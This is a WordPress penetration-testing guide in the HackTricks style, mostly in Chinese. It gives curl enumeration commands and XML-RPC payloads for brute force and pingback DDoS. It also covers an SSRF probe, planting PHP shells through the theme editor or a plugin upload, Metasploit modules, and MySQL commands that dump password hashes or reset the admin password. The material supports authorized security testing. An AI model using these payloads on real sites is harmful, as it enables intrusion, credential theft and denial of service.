# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## åŸºæœ¬ä¿¡æ¯

- **Uploaded** æ–‡ä»¶å­˜æ”¾äº: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** æ‰€ä»¥å¦‚æœä½ ä¿®æ”¹ä¸»é¢˜çš„æŸäº› php æ¥è·å– RCEï¼Œé€šå¸¸ä¼šä½¿ç”¨è¯¥è·¯å¾„ã€‚ä¾‹å¦‚ï¼šä½¿ç”¨ **theme twentytwelve** ä½ å¯ä»¥ **access** **404.php** æ–‡ä»¶äº: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- åœ¨ **wp-config.php** ä¸­å¯ä»¥æ‰¾åˆ°æ•°æ®åº“çš„ root å¯†ç ã€‚
- é»˜è®¤å¯æ£€æŸ¥çš„ç™»å½•è·¯å¾„: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` åŒ…å«æœ‰ç”¨çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å·²å®‰è£…çš„ WordPress ç‰ˆæœ¬ã€‚
- `wp-activate.php` åœ¨è®¾ç½®æ–° WordPress ç«™ç‚¹æ—¶ç”¨äºç”µå­é‚®ä»¶æ¿€æ´»æµç¨‹ã€‚
- ç™»å½•ç›¸å…³æ–‡ä»¶å¤¹ï¼ˆå¯èƒ½è¢«é‡å‘½åä»¥éšè—ï¼‰:
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` æ˜¯ä¸€ä¸ªåŠŸèƒ½æ–‡ä»¶ï¼Œå…è®¸é€šè¿‡ HTTP ä½œä¸ºä¼ è¾“æœºåˆ¶å¹¶ä»¥ XML ä½œä¸ºç¼–ç æœºåˆ¶æ¥ä¼ è¾“æ•°æ®ã€‚è¿™ç§é€šä¿¡æ–¹å¼å·²è¢« WordPress çš„ [REST API](https://developer.wordpress.org/rest-api/reference) æ‰€å–ä»£ã€‚
- `wp-content` æ–‡ä»¶å¤¹æ˜¯å­˜æ”¾ plugins å’Œ themes çš„ä¸»è¦ç›®å½•ã€‚
- `wp-content/uploads/` æ˜¯å¹³å°ä¸Šä¸Šä¼ çš„æ‰€æœ‰æ–‡ä»¶å­˜å‚¨çš„ç›®å½•ã€‚
- `wp-includes/` è¿™æ˜¯å­˜æ”¾æ ¸å¿ƒæ–‡ä»¶çš„ç›®å½•ï¼Œä¾‹å¦‚è¯ä¹¦ã€å­—ä½“ã€JavaScript æ–‡ä»¶å’Œ widgetsã€‚
- `wp-sitemap.xml` åœ¨ WordPress 5.5 åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼ŒWordPress ä¼šç”Ÿæˆä¸€ä¸ªåŒ…å«æ‰€æœ‰å…¬å¼€æ–‡ç« ä»¥åŠå¯å…¬å¼€æŸ¥è¯¢çš„æ–‡ç« ç±»å‹å’Œåˆ†ç±»æ³•çš„ sitemap XML æ–‡ä»¶ã€‚

**Post exploitation**

- `wp-config.php` æ–‡ä»¶åŒ…å« WordPress è¿æ¥æ•°æ®åº“æ‰€éœ€çš„ä¿¡æ¯ï¼Œæ¯”å¦‚æ•°æ®åº“åã€æ•°æ®åº“ä¸»æœºã€ç”¨æˆ·åå’Œå¯†ç ã€è®¤è¯å¯†é’¥å’Œç›ä»¥åŠæ•°æ®åº“è¡¨å‰ç¼€ã€‚è¯¥é…ç½®æ–‡ä»¶ä¹Ÿå¯ä»¥ç”¨äºå¯ç”¨ DEBUG æ¨¡å¼ï¼Œè¿™åœ¨æ•…éšœæ’é™¤æ—¶å¾ˆæœ‰ç”¨ã€‚

### ç”¨æˆ·æƒé™

- **Administrator**
- **Editor**: å‘å¸ƒå¹¶ç®¡ç†ä»–äººå’Œè‡ªå·±çš„æ–‡ç« 
- **Author**: å‘å¸ƒå¹¶ç®¡ç†è‡ªå·±çš„æ–‡ç« 
- **Contributor**: æ’°å†™å¹¶ç®¡ç†è‡ªå·±çš„æ–‡ç« ï¼Œä½†ä¸èƒ½å‘å¸ƒ
- **Subscriber**: æµè§ˆæ–‡ç« å¹¶ç¼–è¾‘ä¸ªäººèµ„æ–™

## **Passive Enumeration**

### **Get WordPress version**

æ£€æŸ¥æ˜¯å¦å¯ä»¥æ‰¾åˆ°æ–‡ä»¶ `/license.txt` æˆ– `/readme.html`

åœ¨é¡µé¢çš„ **æºä»£ç ** ä¸­ï¼ˆç¤ºä¾‹æ¥è‡ª [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)ï¼‰:

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS é“¾æ¥æ–‡ä»¶

![](<../../images/image (533).png>)

- JavaScript æ–‡ä»¶

![](<../../images/image (524).png>)

### è·å–æ’ä»¶
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### è·å–ä¸»é¢˜
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### é€šç”¨åœ°æå–ç‰ˆæœ¬ä¿¡æ¯
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## ä¸»åŠ¨æšä¸¾

### Plugins and Themes

ä½ å¯èƒ½æ— æ³•å‘ç°æ‰€æœ‰å¯èƒ½çš„ Plugins å’Œ Themesã€‚ä¸ºäº†å‘ç°æ‰€æœ‰è¿™äº›ï¼Œä½ éœ€è¦ **ä¸»åŠ¨å¯¹ Plugins å’Œ Themes çš„åˆ—è¡¨è¿›è¡Œ Brute Force**ï¼ˆå¸Œæœ›æœ‰è‡ªåŠ¨åŒ–å·¥å…·åŒ…å«è¿™äº›åˆ—è¡¨ï¼‰ã€‚

### ç”¨æˆ·

- **ID Brute:** ä½ å¯ä»¥é€šè¿‡å¯¹ WordPress ç«™ç‚¹çš„ users IDs è¿›è¡Œ Brute Forcing æ¥è·å–æœ‰æ•ˆç”¨æˆ·ï¼š
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
å¦‚æœå“åº”æ˜¯ **200** æˆ– **30X**ï¼Œè¡¨ç¤ºè¯¥ id ä¸º **æœ‰æ•ˆ**ã€‚å¦‚æœå“åº”æ˜¯ **400**ï¼Œåˆ™è¡¨ç¤ºè¯¥ id ä¸º **æ— æ•ˆ**ã€‚

- **wp-json:** ä½ ä¹Ÿå¯ä»¥é€šè¿‡æŸ¥è¯¢æ¥è·å–å…³äºç”¨æˆ·çš„ä¿¡æ¯ï¼š
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
å¦ä¸€ä¸ªå¯èƒ½é€éœ²ä¸€äº›ç”¨æˆ·ä¿¡æ¯çš„ `/wp-json/` endpoint æ˜¯ï¼š
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
è¯·æ³¨æ„ï¼Œè¯¥ç«¯ç‚¹ä»…ä¼šå…¬å¼€å·²å‘å¸ƒæ–‡ç« çš„ç”¨æˆ·ã€‚**ä»…ä¼šæä¾›å·²å¯ç”¨æ­¤åŠŸèƒ½çš„ç”¨æˆ·çš„ä¿¡æ¯**ã€‚

å¦è¯·æ³¨æ„ï¼Œ**/wp-json/wp/v2/pages** å¯èƒ½ä¼š leak IP åœ°å€ã€‚

- **Login username enumeration**: åœ¨é€šè¿‡ **`/wp-login.php`** ç™»å½•æ—¶ï¼Œ**æ¶ˆæ¯** ä¼š **ä¸åŒ**ï¼Œä»è€Œè¡¨æ˜è¯¥ **ç”¨æˆ·åæ˜¯å¦å­˜åœ¨**ã€‚

### XML-RPC

å¦‚æœ `xml-rpc.php` å¯ç”¨ï¼Œä½ å¯ä»¥å¯¹å‡­è¯è¿›è¡Œ brute-forceï¼Œæˆ–åˆ©ç”¨å®ƒå¯¹å…¶ä»–èµ„æºå‘èµ· DoS æ”»å‡»ã€‚(You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

è¦æ£€æŸ¥å®ƒæ˜¯å¦å¯ç”¨ï¼Œè¯·è®¿é—® _**/xmlrpc.php**_ å¹¶å‘é€ä»¥ä¸‹è¯·æ±‚ï¼š

**æ£€æŸ¥**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** or **`metaWeblog.getUsersBlogs`** æ˜¯ä¸€äº›å¯ä»¥ç”¨æ¥ brute-force credentials çš„æ–¹æ³•ã€‚å¦‚æœä½ èƒ½æ‰¾åˆ°å…¶ä¸­ä»»ä½•ä¸€ä¸ªï¼Œä½ å¯ä»¥å‘é€ç±»ä¼¼ä¸‹é¢çš„å†…å®¹ï¼š
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
å¦‚æœå‡­è¯æ— æ•ˆï¼ŒçŠ¶æ€ç ä¸º 200 çš„å“åº”ä¸­åº”å‡ºç°æ¶ˆæ¯ _"ç”¨æˆ·åæˆ–å¯†ç ä¸æ­£ç¡®"_ã€‚

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

ä½¿ç”¨æ­£ç¡®çš„å‡­è¯å¯ä»¥ä¸Šä¼ æ–‡ä»¶ã€‚åœ¨å“åº”ä¸­ä¼šå‡ºç°è·¯å¾„ ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
å¦å¤–æœ‰ä¸€ç§**æ›´å¿«çš„æ–¹æ³•**æ¥å¯¹ credentials è¿›è¡Œ brute-forceï¼Œä½¿ç”¨ **`system.multicall`**ï¼Œå› ä¸ºä½ å¯ä»¥åœ¨åŒä¸€è¯·æ±‚ä¸­å°è¯•å¤šä¸ª credsï¼š

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**ç»•è¿‡ 2FA**

è¯¥æ–¹æ³•é¢å‘ç¨‹åºè€Œéäººå·¥ä½¿ç”¨ï¼Œä¸”å¹´ä»£è¾ƒä¹…ï¼Œå› æ­¤ä¸æ”¯æŒ 2FAã€‚æ‰€ä»¥ï¼Œå¦‚æœä½ æœ‰æœ‰æ•ˆçš„ creds ä½†ä¸»å…¥å£å— 2FA ä¿æŠ¤ï¼Œ**ä½ å¯èƒ½èƒ½å¤Ÿæ»¥ç”¨ xmlrpc.php ä½¿ç”¨è¿™äº› creds ç™»å½•ä»¥ç»•è¿‡ 2FA**ã€‚æ³¨æ„ï¼Œä½ ä¸èƒ½æ‰§è¡Œé€šè¿‡æ§åˆ¶å°èƒ½åšçš„æ‰€æœ‰æ“ä½œï¼Œä½†æ­£å¦‚ Ippsec åœ¨ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) ä¸­æ‰€è§£é‡Šçš„ï¼Œä½ ä»å¯èƒ½è·å¾— RCEã€‚

**DDoS æˆ– ç«¯å£æ‰«æ**

å¦‚æœä½ èƒ½åœ¨æ–¹æ³•åˆ—è¡¨ä¸­æ‰¾åˆ° _**pingback.ping**_ï¼Œä½ å¯ä»¥è®© Wordpress å‘ä»»æ„ä¸»æœº/ç«¯å£å‘é€ä»»æ„è¯·æ±‚ã€‚\
è¿™å¯ç”¨äºè®©**æ•°åƒ**ä¸ª Wordpress **ç«™ç‚¹**è®¿é—®åŒä¸€ä¸ª**ç›®æ ‡**ï¼ˆä»è€Œåœ¨è¯¥ç›®æ ‡é€ æˆ **DDoS**ï¼‰ï¼Œæˆ–è€…ä½ å¯ä»¥ç”¨å®ƒè®© **Wordpress** å»**æ‰«æ**æŸäº›å†…éƒ¨**ç½‘ç»œ**ï¼ˆä½ å¯ä»¥æŒ‡å®šä»»æ„ç«¯å£ï¼‰ã€‚
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

å¦‚æœä½ å¾—åˆ° **faultCode** çš„å€¼ **å¤§äº** **0** (17)ï¼Œåˆ™è¡¨ç¤ºç«¯å£å·²å¼€æ”¾ã€‚

æŸ¥çœ‹ä¸Šä¸€èŠ‚ä¸­ **`system.multicall`** çš„ç”¨æ³•ï¼Œå­¦ä¹ å¦‚ä½•æ»¥ç”¨è¯¥æ–¹æ³•å‘åŠ¨ DDoSã€‚

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

æ­¤æ–‡ä»¶é€šå¸¸å­˜åœ¨äº Wordpress ç«™ç‚¹æ ¹ç›®å½•ä¸‹ï¼š**`/wp-cron.php`**\
å½“æ­¤æ–‡ä»¶è¢«**è®¿é—®**æ—¶ï¼Œä¼šæ‰§è¡Œä¸€ä¸ªâ€œ**heavy**â€çš„ MySQL **query**ï¼Œå› æ­¤å¯èƒ½è¢«**attackers**ç”¨æ¥**cause**ä¸€ä¸ª**DoS**ã€‚\
æ­¤å¤–ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ`wp-cron.php` ä¼šåœ¨æ¯æ¬¡é¡µé¢åŠ è½½æ—¶è¢«è°ƒç”¨ï¼ˆå³å®¢æˆ·ç«¯è¯·æ±‚ä»»ä½• Wordpress é¡µé¢æ—¶ï¼‰ï¼Œåœ¨é«˜æµé‡ç«™ç‚¹ä¸Šå¯èƒ½å¯¼è‡´é—®é¢˜ï¼ˆDoSï¼‰ã€‚

å»ºè®®ç¦ç”¨ Wp-Cronï¼Œå¹¶åœ¨ä¸»æœºä¸Šåˆ›å»ºä¸€ä¸ªçœŸå®çš„ cronjob æ¥å®šæœŸæ‰§è¡Œæ‰€éœ€æ“ä½œï¼ˆä»¥é¿å…äº§ç”Ÿé—®é¢˜ï¼‰ã€‚

### /wp-json/oembed/1.0/proxy - SSRF

å°è¯•è®¿é—® _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ï¼ŒWorpress site å¯èƒ½ä¼šå‘ä½ å‘èµ·è¯·æ±‚ã€‚

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

è¯¥å·¥å…·æ£€æŸ¥æ˜¯å¦å­˜åœ¨ **methodName: pingback.ping** ä»¥åŠ è·¯å¾„ **/wp-json/oembed/1.0/proxy**ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™å°è¯•åˆ©ç”¨å®ƒä»¬ã€‚

## è‡ªåŠ¨åŒ–å·¥å…·
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## é€šè¿‡ç¿»è½¬ä¸€ä¸ªæ¯”ç‰¹è·å–è®¿é—®æƒé™

è¿™ä¸å…¶è¯´æ˜¯çœŸæ­£çš„æ”»å‡»ï¼Œä¸å¦‚è¯´æ˜¯ä¸ªå¥½å¥‡çš„ä¾‹å­ã€‚åœ¨è¯¥ CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) ä¸­ï¼Œä½ å¯ä»¥ç¿»è½¬ä»»æ„ wordpress æ–‡ä»¶çš„ 1 ä¸ªæ¯”ç‰¹ã€‚å› æ­¤ä½ å¯ä»¥å°†æ–‡ä»¶ `/var/www/html/wp-includes/user.php` çš„ä½ç½® `5389` ç¿»è½¬ï¼Œä»è€ŒæŠŠ NOT (`!`) æ“ä½œ NOP æ‰ã€‚
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**ä¿®æ”¹æ‰€ä½¿ç”¨ä¸»é¢˜ä¸­çš„ phpï¼ˆéœ€è¦ admin credentialsï¼‰**

Appearance â†’ Theme Editor â†’ 404 Templateï¼ˆåœ¨å³ä¾§ï¼‰

å°†å†…å®¹æ›´æ”¹ä¸º php shellï¼š

![](<../../images/image (384).png>)

åœ¨äº’è”ç½‘ä¸Šæœç´¢å¦‚ä½•è®¿é—®è¯¥å·²æ›´æ–°çš„é¡µé¢ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œæ‚¨éœ€è¦è®¿é—®ï¼š[http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

æ‚¨å¯ä»¥ä½¿ç”¨ï¼š
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
ä»¥è·å–ä¼šè¯ã€‚

## Plugin RCE

### PHP plugin

å¯èƒ½å¯ä»¥å°† .php æ–‡ä»¶ä½œä¸º plugin ä¸Šä¼ ã€‚åˆ›å»ºä½ çš„ php backdoorï¼Œä¾‹å¦‚ï¼š

![](<../../images/image (183).png>)

ç„¶åæ·»åŠ ä¸€ä¸ªæ–°çš„ pluginï¼š

![](<../../images/image (722).png>)

ä¸Šä¼  plugin å¹¶æŒ‰ Install Nowï¼š

![](<../../images/image (249).png>)

ç‚¹å‡» Proccedï¼š

![](<../../images/image (70).png>)

è¿™çœ‹èµ·æ¥å¯èƒ½ä¸ä¼šæœ‰ä»»ä½•ååº”ï¼Œä½†å¦‚æœä½ è¿›å…¥ Mediaï¼Œä½ ä¼šçœ‹åˆ°ä½ çš„ shell è¢«ä¸Šä¼ ï¼š

![](<../../images/image (462).png>)

è®¿é—®å®ƒï¼Œä½ å°†çœ‹åˆ°ç”¨äºæ‰§è¡Œ reverse shell çš„ URLï¼š

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

è¯¥æ–¹æ³•æ¶‰åŠå®‰è£…å·²çŸ¥å­˜åœ¨æ¼æ´çš„æ¶æ„ pluginï¼Œå¯è¢«åˆ©ç”¨ä»¥è·å– web shellã€‚è¯¥è¿‡ç¨‹é€šè¿‡ WordPress ä»ªè¡¨ç›˜æ‰§è¡Œï¼Œå¦‚ä¸‹ï¼š

1. **Plugin Acquisition**: è¯¥ plugin å¯ä» Exploit DB ç­‰æ¥æºè·å–ï¼Œä¾‹å¦‚ [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- å‰å¾€ WordPress ä»ªè¡¨ç›˜ï¼Œç„¶åè¿›å…¥ `Dashboard > Plugins > Upload Plugin`.
- ä¸Šä¼ ä¸‹è½½çš„ plugin çš„ zip æ–‡ä»¶ã€‚
3. **Plugin Activation**: æ’ä»¶å®‰è£…æˆåŠŸåï¼Œå¿…é¡»é€šè¿‡ä»ªè¡¨ç›˜æ¿€æ´»ã€‚
4. **Exploitation**:
- å½“å®‰è£…å¹¶æ¿€æ´»äº† "reflex-gallery" plugin æ—¶ï¼Œå¯åˆ©ç”¨è¯¥å·²çŸ¥æ¼æ´è¿›è¡Œæ”»å‡»ã€‚
- Metasploit framework æä¾›äº†é’ˆå¯¹è¯¥æ¼æ´çš„ exploitã€‚é€šè¿‡åŠ è½½ç›¸åº”æ¨¡å—å¹¶æ‰§è¡Œç‰¹å®šå‘½ä»¤ï¼Œå¯ä»¥å»ºç«‹ meterpreter ä¼šè¯ï¼Œä»è€Œè·å¾—å¯¹ç«™ç‚¹çš„æœªç»æˆæƒè®¿é—®ã€‚
- åº”æ³¨æ„ï¼Œè¿™åªæ˜¯åˆ©ç”¨ WordPress ç«™ç‚¹çš„ä¼—å¤šæ–¹æ³•ä¹‹ä¸€ã€‚

å†…å®¹åŒ…å«åœ¨ WordPress ä»ªè¡¨ç›˜ä¸­å®‰è£…å¹¶æ¿€æ´» plugin æ­¥éª¤çš„å›¾ç¤ºè¯´æ˜ã€‚ä½†é‡è¦çš„æ˜¯è¦æ³¨æ„ï¼šåœ¨æ²¡æœ‰é€‚å½“æˆæƒçš„æƒ…å†µä¸‹ä»¥è¿™ç§æ–¹å¼åˆ©ç”¨æ¼æ´æ˜¯éæ³•ä¸”ä¸é“å¾·çš„ã€‚æœ¬ä¿¡æ¯åº”è´Ÿè´£ä»»åœ°ä½¿ç”¨ï¼Œä»…é™äºåˆæ³•åœºæ™¯ï¼Œä¾‹å¦‚ç»è¿‡æ˜ç¡®è®¸å¯çš„ æ¸—é€æµ‹è¯•ã€‚

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## ä» XSS åˆ° RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ æ˜¯ä¸€ä¸ªè„šæœ¬ï¼Œæ—¨åœ¨å°† **Cross-Site Scripting (XSS)** æ¼æ´å‡çº§ä¸º **Remote Code Execution (RCE)** æˆ– WordPress ä¸­çš„å…¶ä»–ä¸¥é‡æ¼æ´ã€‚æ›´å¤šä¿¡æ¯è¯·å‚è§ [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html)ã€‚å®ƒæä¾›å¯¹ Wordpress ç‰ˆæœ¬ 6.X.Xã€5.X.X å’Œ 4.X.X çš„æ”¯æŒï¼Œå¹¶å…è®¸ï¼š
- _**Privilege Escalation:**_ åœ¨ WordPress ä¸­åˆ›å»ºä¸€ä¸ªç”¨æˆ·ã€‚
- _**(RCE) Custom Plugin (backdoor) Upload:**_ ä¸Šä¼ ä½ çš„è‡ªå®šä¹‰ plugin (backdoor) åˆ° WordPressã€‚
- _**(RCE) Built-In Plugin Edit:**_ ç¼–è¾‘ WordPress å†…ç½®çš„ pluginã€‚
- _**(RCE) Built-In Theme Edit:**_ ç¼–è¾‘ WordPress å†…ç½®çš„ themeã€‚
- _**(Custom) Custom Exploits:**_ ä¸ºç¬¬ä¸‰æ–¹ WordPress plugins/themes æä¾›è‡ªå®šä¹‰ exploitã€‚

## Post Exploitation

æå–ç”¨æˆ·åå’Œå¯†ç ï¼š
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
æ›´æ”¹ admin password:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress æ’ä»¶ Pentest

### æ”»å‡»é¢

äº†è§£ Wordpress æ’ä»¶å¦‚ä½•æš´éœ²åŠŸèƒ½å¯¹äºå‘ç°å…¶åŠŸèƒ½ä¸Šçš„æ¼æ´è‡³å…³é‡è¦ã€‚ä½ å¯ä»¥åœ¨ä¸‹é¢çš„è¦ç‚¹ä¸­æ‰¾åˆ°æ’ä»¶å¯èƒ½å¦‚ä½•æš´éœ²åŠŸèƒ½ï¼Œä»¥åŠä¸€äº›æ˜“å—æ”»å‡»æ’ä»¶çš„ç¤ºä¾‹ï¼Œè¯·å‚é˜… [**è¿™ç¯‡åšå®¢æ–‡ç« **](https://nowotarski.info/wordpress-nonce-authorization/)ã€‚

- **`wp_ajax`**

æ’ä»¶å°†å‡½æ•°æš´éœ²ç»™ç”¨æˆ·çš„æ–¹å¼ä¹‹ä¸€æ˜¯é€šè¿‡ AJAX å¤„ç†ç¨‹åºã€‚ è¿™äº›å¤„ç†ç¨‹åºå¯èƒ½åŒ…å«é€»è¾‘ã€æˆæƒæˆ–è®¤è¯æ–¹é¢çš„æ¼æ´ã€‚æ­¤å¤–ï¼Œè¿™äº›å‡½æ•°ç»å¸¸ä¼šå°†è®¤è¯å’Œæˆæƒéƒ½åŸºäº Wordpress nonce çš„å­˜åœ¨ï¼Œè€Œ**Wordpress å®ä¾‹ä¸­ä»»ä½•å·²è®¤è¯çš„ç”¨æˆ·éƒ½å¯èƒ½æ‹¥æœ‰**ï¼ˆä¸å…¶è§’è‰²æ— å…³ï¼‰ã€‚

ä¸‹é¢æ˜¯å¯ä»¥ç”¨æ¥åœ¨æ’ä»¶ä¸­æš´éœ²åŠŸèƒ½çš„å‡½æ•°ï¼š
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**ä½¿ç”¨ `nopriv` ä¼šä½¿è¯¥ endpoint å¯¹ä»»ä½•ç”¨æˆ·å¯è®¿é—®ï¼ˆç”šè‡³æœªè®¤è¯çš„ç”¨æˆ·ï¼‰ã€‚**

> [!CAUTION]
> æ­¤å¤–ï¼Œå¦‚æœå‡½æ•°åªæ˜¯ä½¿ç”¨ `wp_verify_nonce` æ¥æ£€æŸ¥ç”¨æˆ·çš„æˆæƒï¼Œè¯¥å‡½æ•°é€šå¸¸åªéªŒè¯ç”¨æˆ·æ˜¯å¦å·²ç™»å½•ï¼Œå¹¶ä¸æ£€æŸ¥ç”¨æˆ·çš„è§’è‰²ã€‚å› æ­¤ä½æƒé™ç”¨æˆ·å¯èƒ½èƒ½å¤Ÿè®¿é—®é«˜æƒé™çš„æ“ä½œã€‚

- **REST API**

ä¹Ÿå¯ä»¥é€šè¿‡åœ¨ wordpress ä¸­ä½¿ç”¨ `register_rest_route` å‡½æ•°æ³¨å†Œ REST API è·¯ç”±æ¥æš´éœ²å‡½æ•°ï¼š
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
`permission_callback` æ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œç”¨äºæ£€æŸ¥ç»™å®šç”¨æˆ·æ˜¯å¦æœ‰æƒé™è°ƒç”¨è¯¥ API æ–¹æ³•ã€‚

**å¦‚æœä½¿ç”¨å†…ç½®çš„ `__return_true` å‡½æ•°ï¼Œå®ƒå°†ç®€å•åœ°è·³è¿‡ç”¨æˆ·æƒé™æ£€æŸ¥ã€‚**

- **ç›´æ¥è®¿é—® php æ–‡ä»¶**

å½“ç„¶ï¼ŒWordpress ä½¿ç”¨ PHPï¼Œæ’ä»¶å†…çš„æ–‡ä»¶å¯ä»¥ç›´æ¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚å› æ­¤ï¼Œå¦‚æœæŸä¸ªæ’ä»¶æš´éœ²äº†ä»»ä½•ä»…éœ€è®¿é—®è¯¥æ–‡ä»¶å³å¯è§¦å‘çš„æ˜“å—æ”»å‡»åŠŸèƒ½ï¼Œå°±ä¼šè¢«ä»»ä½•ç”¨æˆ·åˆ©ç”¨ã€‚

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

ä¸€äº›æ’ä»¶ä¸ºå†…éƒ¨é›†æˆæˆ–åå‘ä»£ç†å®ç°äº†â€œtrusted headerâ€å¿«æ·æ–¹å¼ï¼Œç„¶åä½¿ç”¨è¯¥ header ä¸º REST è¯·æ±‚è®¾ç½®å½“å‰ç”¨æˆ·ä¸Šä¸‹æ–‡ã€‚å¦‚æœè¯¥ header æœªç”±ä¸Šæ¸¸ç»„ä»¶ä»¥å¯†ç å­¦æ–¹å¼ä¸è¯·æ±‚ç»‘å®šï¼Œæ”»å‡»è€…å¯ä»¥ä¼ªé€ å®ƒå¹¶ä»¥ç®¡ç†å‘˜èº«ä»½è®¿é—®æœ‰ç‰¹æƒçš„ REST è·¯ç”±ã€‚

- å½±å“ï¼šæœªè®¤è¯ç”¨æˆ·å¯é€šè¿‡ core users REST route åˆ›å»ºæ–°çš„ç®¡ç†å‘˜ï¼Œä»è€Œææƒä¸ºç®¡ç†å‘˜ã€‚
